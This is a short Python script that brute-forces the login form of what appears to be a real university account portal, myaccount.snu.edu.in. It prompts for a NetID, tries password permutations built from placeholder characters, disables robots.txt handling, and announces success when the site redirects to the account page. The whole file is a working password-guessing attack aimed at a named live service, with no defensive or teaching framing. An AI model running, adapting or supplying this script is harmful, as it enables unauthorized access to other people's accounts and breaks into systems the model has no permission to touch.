#!/usr/bin/python
import mechanize 
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
user=raw_input("Enter the NetID:- ")

combos = itertools.permutations("SOME_CHARACTERS",SIZE_OF_PASSWORD) 
br.open("http://myaccount.snu.edu.in/login.php")
for x in combos:	
	br.select_form(nr=0)
	br.form["snuNetId"] = user
	br.form["password"] = ''.join(x)
	print "Checking ",br.form["password"]
	response=br.submit()
	if response.geturl()=="http://myaccount.snu.edu.in/myAccountInfo.php":
		#url to which the page is redirected after login
		print "Brute force successful with:-  ",''.join(x)
		break
